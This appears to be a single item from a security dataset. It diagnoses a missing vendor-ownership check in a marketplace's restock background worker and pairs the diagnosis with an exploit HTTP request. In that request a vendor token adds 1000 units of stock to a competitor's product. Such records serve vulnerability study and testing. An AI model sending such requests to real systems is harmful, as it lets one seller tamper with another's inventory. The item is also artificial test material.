diagnosis: The ApplyRestock background worker routine applies inventory adjustments directly to ProductID without validating that InitiatedBy is the registered vendor for the product. In a multi-vendor marketplace, a rogue vendor can increase or distort stock levels for competing sellers.
exploit_request:
POST /api/inventory/queue-restock HTTP/1.1
Host: marketplace.merchant-hub.com
Authorization: Bearer vendor_token_40
Content-Type: application/json

{"product_id": "prod_competitor_102", "add_stock": 1000}
